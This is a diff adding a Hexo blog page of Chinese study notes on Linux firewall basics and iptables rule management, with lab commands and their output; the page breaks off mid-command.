@@ -1,0 +1,894 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Linux防火墙技术 1234总结：1.基于某个段的过滤：INPUT chain2.本机作为iptables防火墙进行转发：FORWARD chain3.作为NAT网关：在nat表(-t nat)，SNAT在POSTROUTING chain做转发-d为非内网网段(! -d 10.0.0.0&#x2F;24)；DNAT在PREROUTING做转发(目标地址为外网地址)，destination为目标主机+端口">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux防火墙技术">
+<meta property="og:url" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/index.html">
+<meta property="og:site_name" content="Mgedu-N80054">
+<meta property="og:description" content="Linux防火墙技术 1234总结：1.基于某个段的过滤：INPUT chain2.本机作为iptables防火墙进行转发：FORWARD chain3.作为NAT网关：在nat表(-t nat)，SNAT在POSTROUTING chain做转发-d为非内网网段(! -d 10.0.0.0&#x2F;24)；DNAT在PREROUTING做转发(目标地址为外网地址)，destination为目标主机+端口">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181112243-583103263.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181112783-192218826.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181113147-1045072885.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181113416-105127330.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181113693-28668394.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181113980-1910491149.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181114268-121294755.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181114579-1186931059.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181114863-700868194.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181115151-1306412835.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181115451-1027421414.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181115773-566092871.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181116060-1442443540.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181116392-132789822.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181116707-944456070.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181117072-1546640363.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181117452-699103923.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181117815-1787667441.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181118152-528216290.png">
+<meta property="og:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181118478-1291676721.png">
+<meta property="article:published_time" content="2023-07-28T19:19:09.000Z">
+<meta property="article:modified_time" content="2023-07-30T21:21:40.961Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/07/28/Linux%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/2792175-20220828181112243-583103263.png">
+  
+  
+  <title>Linux防火墙技术 - Mgedu-N80054</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>JohnBackus</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Linux防火墙技术">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2023-07-28 19:19" pubdate>
+        July 28, 2023 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      22k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      186 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Linux防火墙技术</h1>
+            
+            <div class="markdown-body">
+              <h1 id="Linux防火墙技术"><a href="#Linux防火墙技术" class="headerlink" title="Linux防火墙技术"></a>Linux防火墙技术</h1><p><img src="2792175-20220828181112243-583103263.png" srcset="/img/loading.gif" lazyload alt="image-20220727222535470"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">总结：<br>1.基于某个段的过滤：INPUT chain<br>2.本机作为iptables防火墙进行转发：FORWARD chain<br>3.作为NAT网关：在nat表(-t nat)，SNAT在POSTROUTING chain做转发-d为非内网网段(! -d 10.0.0.0/24)；DNAT在PREROUTING做转发(目标地址为外网地址)，destination为目标主机+端口<br></code></pre></td></tr></table></figure>
+
+<p>基本的安全技术：</p>
+<p>1.入侵检测系统：不阻拦外部攻击行为，检测出对应的攻击行为，一般都是监控系统，事后处理</p>
+<p>2.入侵防御系统：阻断攻击行为，分析例如木马，蠕虫，系统漏洞等攻击行为，在线部署防火墙，SSH攻击，DDOS攻击等</p>
+<p>3.防火墙：部署在整体网络架构的最外部，允许一些规则、流量流入，拒绝流量流入；</p>
+<p>云环境：WAF(应用防火墙)，云防火墙(IP流量防火墙)</p>
+<p>线下：部署在DMZ区，介于outbound和inbound之间，分为trust(信任区)和untrust(不信任区)</p>
+<p>主机层面：防火墙，企业主机安全等(配额)</p>
+<p>tar -xf：解压包</p>
+<p>tar -czf：压缩包</p>
+<p>tar -tvf：查看包内的文件</p>
+<p>应用层防火墙：阿里云/华为云的WAF，用于url层面的防护，上传文件是否合法，大小写(七层)</p>
+<p>网络层防火墙：边界防火墙，主要是针对IP层面的防护，流量级别的防护，IP+端口，包过滤防火墙</p>
+<p>Internet：untrust区</p>
+<p>防火墙</p>
+<p>DMZ区：用于部署负载均衡，公司用的是硬件负载均衡F5，用于对外提供服务的服务区放置的，比如FTP服务器，WEB服务器网站等</p>
+<p>内网：trust区，接入核心交换机—汇聚层—接入层等</p>
+<h1 id="Linux内核防火墙iptables"><a href="#Linux内核防火墙iptables" class="headerlink" title="Linux内核防火墙iptables"></a>Linux内核防火墙iptables</h1><p>开源的防火墙功能，主要包括防火墙firewall，NAT以及数据包过滤等技术，存在于内核kernal中，无论是哪个防火墙软件，都是依赖于内核功能netfilter</p>
+<p>centos6：iptables</p>
+<p>centos7：firewalld</p>
+<p>centos8：nft</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs none">[root@master script]#which iptables<br>/usr/sbin/iptables<br>[root@master script]#ll `which iptables`<br>lrwxrwxrwx. 1 root root 13 Feb 19 12:44 /usr/sbin/iptables -&gt; xtables-multi<br><br>rpm -ql iptables<br>rpm -q iptables：查看iptables的安装情况<br></code></pre></td></tr></table></figure>
+
+<p>5个钩子函数：总入口PRE-ROUTING，INPUT(到内部)，OUTPUT(内部出去)，FORWARD(穿过本机出去)，POST-ROUTING(总出口)</p>
+<p>称为chain(链子)</p>
+<p>通过iptables可以控制五种协议的执行，放行某些数据包等</p>
+<p>上层协议栈：内部访问的应用的协议，比如http/https，TCP/IP端口等；一般来说，访问到内部的服务，一般配置INPUT</p>
+<p><img src="2792175-20220828181112783-192218826.png" srcset="/img/loading.gif" lazyload alt="image-20220724174240149"></p>
+<h2 id="Linux-netfilter内的5个表-5表5链"><a href="#Linux-netfilter内的5个表-5表5链" class="headerlink" title="Linux netfilter内的5个表(5表5链)"></a>Linux netfilter内的5个表(5表5链)</h2><p>每个chain对应一个钩子函数，5表5链，钩子函数称为webhook，钩子</p>
+<p>5个表table：<strong>最主要：filter和NAT</strong></p>
+<p>filter：过滤规则，允许/拒绝某些流量流入，比如INPUT，OUPUT等</p>
+<p>NAT：地址转换表，包括SNAT和DNAT</p>
+<p>mangle：修改数据规则表</p>
+<p>raw：加快通过防火墙的速度</p>
+<p>security：强制安全规则，由SELINUX实现，/etc/</p>
+<h1 id="iptables基本参数-公有云iptables原理"><a href="#iptables基本参数-公有云iptables原理" class="headerlink" title="iptables基本参数(公有云iptables原理)"></a>iptables基本参数(公有云iptables原理)</h1><p>公有云iptables原理：默认拒绝所有</p>
+<p>iptables -A INPUT -j REJECT</p>
+<p>需要一条一条规则去放行，或者是端口，这些规则需要写在拒绝所有规则的前面，放xxx网段对应的端口，只不过做成了SAAS产品</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs none">-p tcp/udp --dport 80<br>-p tcp -m multiport --dports 80,443,8081<br>-p tcp -m iprange --src-range 10.0.0.129-10.0.0.254<br></code></pre></td></tr></table></figure>
+
+<p>默认用的就是filter表，主要包括的chain链如下：</p>
+<p>主要使用的chain：INPUT(输入)，FORWARD(转发)，OUTPUT(输出)</p>
+<p>TCP三次握手协议：可以看到TCP连接的状态，一般都是有去有回的，比如SSH连接，建立了就是ESTABLISHED建立连接状态，或者是LISTENING监听状态，没和服务器建立连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -nL：查看iptables基本规则或者iptables -vnL，常用-nL<br>iptables -F：关闭iptables功能<br>-v：查看细节，chain等<br>-s：源地址<br>-d：目的地址<br>-j：动作，DROP丢弃<br><br>iptables -S：查看目前已经创建的规则<br><span class="hljs-comment">##简单写一条拒绝iptables指令，从10.0.0.129任何数据包都无法到10.0.0.128了，且两边都无法ping通，C/S架构，icmp包要去了能回来才行</span><br>iptables -A INPUT -s 10.0.0.129 -j DROP<br><br><span class="hljs-comment">##简单使用tcpdump在10.0.0.128上抓个包看看，-i网卡，-n网络协议，通过防火墙策略拒绝了包的发送，其实icmp包是相互，双向的</span><br>tcpdump -i ens33 -n icmp<br></code></pre></td></tr></table></figure>
+
+<p><img src="2792175-20220828181113147-1045072885.png" srcset="/img/loading.gif" lazyload alt="image-20220727220826893"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">iptables -vnL：还可以看到这个规则拒绝了多少个包<br></code></pre></td></tr></table></figure>
+
+<p><img src="2792175-20220828181113416-105127330.png" srcset="/img/loading.gif" lazyload alt="image-20220727215225662"></p>
+<h2 id="iptables基本匹配规则-基本功能"><a href="#iptables基本匹配规则-基本功能" class="headerlink" title="iptables基本匹配规则(基本功能)"></a>iptables基本匹配规则(基本功能)</h2><p>按照插入的规则顺序进行过滤filter</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">-s：源地址<br>-d：目的地址<br>-p：protocal协议<br>-m：启用扩展模块<br><br><span class="hljs-comment">##TARGET动作</span><br>iptables -j：对-s来的数据包操作<br>-j DROP：丢弃，不回应<br>-j REJECT：拒绝，refuse包<br>-j ACCEPT：接受，允许<br><br>iptables -F：删除掉某个chain的规则<br>iptables -F WEB：清空掉有关自定义链的内容<br><br>iptables -A <span class="hljs-comment">##默认添加，到最后面，在现有的规则上新加一条</span><br>iptables -D INPUT 5 <span class="hljs-comment">##删除掉第五行iptables</span><br>iptables -I INPUT -s 10.0.0.129 -j REJECT <span class="hljs-comment">##-I表示在最前面插入一条规则，默认走最前面的规则，最好都走-I，插到最前面</span><br>iptables -P INPUT <span class="hljs-comment">##修改整个chain链的规则，比如都为REJECT或者是DROP</span><br><br><span class="hljs-comment">##一般来说，在企业内的主机出方向都是不受限制，OUTPUT，入方向限制比较多，可以设定加白策略</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="2792175-20220828181113693-28668394.png" srcset="/img/loading.gif" lazyload alt="image-20220728222651565"></p>
+<p>拒绝所有的10.0.0.129的包，只允许icmp包(插入顺序)，也可以-I指定插入的行数(条目数)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -I INPUT -s 10.0.0.129 -j REJECT<br>iptables -I INPUT -s 10.0.0.129 -p icmp -j ACCEPT<br><span class="hljs-comment">##换成telnet 10.0.0.128，会显示连接被拒绝，refused，就是REJECT规则的写法</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="2792175-20220828181113980-1910491149.png" srcset="/img/loading.gif" lazyload alt="image-20220728224656139"></p>
+<h2 id="iptables配置别名alias显示行号：alias-ipnum-’iptables-nL-–line-numbers’"><a href="#iptables配置别名alias显示行号：alias-ipnum-’iptables-nL-–line-numbers’" class="headerlink" title="iptables配置别名alias显示行号：alias ipnum=’iptables -nL –line-numbers’"></a>iptables配置别名alias显示行号：alias ipnum=’iptables -nL –line-numbers’</h2><p>默认iptables -nL不显示行号，–line-numbers显示行号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs none">alias iptables -nl=&#x27;iptables -nl --line-numbers&#x27;<br>alias ipnum=&#x27;iptables -nL --line-numbers&#x27;<br>source .bashrc<br>使用这个别名alias<br></code></pre></td></tr></table></figure>
+
+<h2 id="配置永久保存iptables规则：services-iptables-save"><a href="#配置永久保存iptables规则：services-iptables-save" class="headerlink" title="配置永久保存iptables规则：services iptables save"></a>配置永久保存iptables规则：services iptables save</h2><p>在Cent OS 6下，由于本身就有/etc/sysconfig/iptables文件，所以只需要执行即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">service iptables save<br></code></pre></td></tr></table></figure>
+
+<p>在Cent OS 7下，由于默认没有安装iptables.services服务，所以需要安装一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum -y install iptables.services<br>systemctl <span class="hljs-built_in">enable</span> --now iptables<br><br>service iptables save <span class="hljs-comment">##保存iptables规则</span><br>iptables: Saving firewall rules to /etc/sysconfig/iptables:[  OK  ]<br><br>尝试一下reboot重启<br></code></pre></td></tr></table></figure>
+
+<p><img src="2792175-20220828181114268-121294755.png" srcset="/img/loading.gif" lazyload alt="image-20220728232225920"></p>
+<p>cat /etc/sysconfig/iptables：查看一下iptables配置文件，里面写的都是默认规则</p>
+<h1 id="iptables扩展模块-隐"><a href="#iptables扩展模块-隐" class="headerlink" title="iptables扩展模块(隐)"></a>iptables扩展模块(隐)</h1><p>tcp/udp模块：默认隐式扩展模块，不需要写-m扩展模块，一般的写法是iptables -I INPUT -p tcp -m tcp/udp等这样</p>
+<p>允许10.0.0.129访问128的httpd服务(80)端口，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##还是需要写上-p tcp表示允许什么协议通过</span><br>-p：什么协议protocal<br>--dport：目标端口<br>-s：写上源端口<br>-j：写上操作<br><br><span class="hljs-comment">##先拒绝所有，在单独放行80端口的访问，这里的--dport不加s</span><br>iptables -A INPUT -s 10.0.0.129 -j REJECT<br>iptables -I INPUT 2 -p tcp --dport 80 -s 10.0.0.129 -j ACCEPT<br><br>ipnum<br>[root@master ~]<span class="hljs-comment">#iptables -I INPUT 2 -p tcp --dport 80 -s 10.0.0.129 -j ACCEPT</span><br>[root@master ~]<span class="hljs-comment">#ipnum </span><br>Chain INPUT (policy ACCEPT)<br>num  target     prot opt <span class="hljs-built_in">source</span>               destination         <br>1    ACCEPT     icmp --  10.0.0.129           0.0.0.0/0           <br>2    ACCEPT     tcp  --  10.0.0.129           0.0.0.0/0            tcp dpt:80<br>3    REJECT     all  --  10.0.0.129           0.0.0.0/0            reject-with icmp-port-unreachable<br><br>iptables -R INPUT：表示replace，替换掉某一条规则<br></code></pre></td></tr></table></figure>
+
+<p>在10.0.0.129上访问10.0.0.128的80端口是成功的</p>
+<p>curl k8s.catyer.cn</p>
+<p>telnet k8s.catyer.cn 80</p>
+<h1 id="iptables扩展模块-显-：可以多个扩展模块组合"><a href="#iptables扩展模块-显-：可以多个扩展模块组合" class="headerlink" title="iptables扩展模块(显)：可以多个扩展模块组合"></a>iptables扩展模块(显)：可以多个扩展模块组合</h1><p>让httpd协议支持ssl：安装mod_ssl模块服务</p>
+<p>yum -y install mod_ssl</p>
+<p>systemctl enable –now httpd</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://k8s.catyer.cn <span class="hljs-comment">##是OK的</span><br>curl -k https://k8s.catyer.cn <span class="hljs-comment">##忽略SSL安装告警</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="2792175-20220828181114579-1186931059.png" srcset="/img/loading.gif" lazyload alt="image-20220729230840271"></p>
+<h2 id="m-multiport-–dports-80-443：批量添加端口，注意–dports加s"><a href="#m-multiport-–dports-80-443：批量添加端口，注意–dports加s" class="headerlink" title="-m multiport –dports 80,443：批量添加端口，注意–dports加s"></a>-m multiport –dports 80,443：批量添加端口，注意–dports加s</h2><p>示例：一条iptables规则放通80,443端口，129能够访问128的443和80端口</p>
+<p>先-p：表示跑什么协议，-m表示扩展模块为multiport，–dports记得s</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -I INPUT -p tcp -m multiport --dports 80,443 -s 10.0.0.129 -j ACCEPT<br>ipnum<br>Chain INPUT (policy ACCEPT)<br>num  target     prot opt <span class="hljs-built_in">source</span>               destination         <br>1    ACCEPT     tcp  --  10.0.0.129           0.0.0.0/0            multiport dports 80,443<br><br>slave1---&gt;master的443流量可以打开了<br></code></pre></td></tr></table></figure>
+
+<p><img src="2792175-20220828181114863-700868194.png" srcset="/img/loading.gif" lazyload alt="image-20220729233040836"></p>
+<p><img src="2792175-20220828181115151-1306412835.png" srcset="/img/loading.gif" lazyload alt="image-20220729233616409"></p>
+<h2 id="N-WEB-CHAIN：创建自定义链"><a href="#N-WEB-CHAIN：创建自定义链" class="headerlink" title="-N WEB-CHAIN：创建自定义链"></a>-N WEB-CHAIN：创建自定义链</h2><p>自定义链：是一个模块化的东西，相当于是一个函数</p>
+<p>iptables的链chain分为主链和自定义链，主链部分分为pre-routing，input，forward，output，post-routing，自定义链可以自行创建</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">-N：创建新的自定义链<br>-E old chain new chain：修改自定义链名字<br>-X：删除空的自定义链，必须是在INPUT表内没有调用，并且表内规则为空<br><br>iptables -S：显示目前已经创建的链规则，包括自带系统链和自定义链<br>[root@master ~]<span class="hljs-comment">#iptables -S</span><br>-P INPUT ACCEPT<br>-P FORWARD ACCEPT<br>-P OUTPUT ACCEPT<br>-N DOCKER<br>-N DOCKER-ISOLATION<br>-N WEB<br>-A INPUT -i virbr0 -p udp -m udp --dport 53 -j ACCEPT<br>-A INPUT -i virbr0 -p tcp -m tcp --dport 53 -j ACCEPT<br>-A INPUT -i virbr0 -p udp -m udp --dport 67 -j ACCEPT<br>-A INPUT -i virbr0 -p tcp -m tcp --dport 67 -j ACCEPT<br><br><br><span class="hljs-comment">##写自定义链</span><br>iptables -A INPUT(这里其实是写链名chain)<br>iptables -A WEB(写到自定义链中)<br><br><span class="hljs-comment">##将之前定义好的iptables规则写入WEB链中</span><br>iptables -I WEB -p tcp -m multiport --dports 80,443 -s 10.0.0.129 -j ACCEPT<br>Chain WEB (0 references)<br>num  target     prot opt <span class="hljs-built_in">source</span>               destination         <br>1    ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0            multiport dports 80,443<br><br><span class="hljs-comment">##上面的INPUT链就不需要了，直接写WEB链就可以了</span><br>iptables -D INPUT 5<br><br><span class="hljs-comment">##调用WEB函数，使其生效，插入到第五条INPUT链中，测试访问443端口是OK的；拟定一个UDP协议的端口53，加入到WEB内，不用修改INPUT主表</span><br>iptables -I INPUT 5 -j WEB	<br>iptables -A WEB -p udp --dport 53 -s 10.0.0.129 -j ACCEPT<br><br>[09:04:49 root@slave1 ~]<span class="hljs-comment">#curl -k 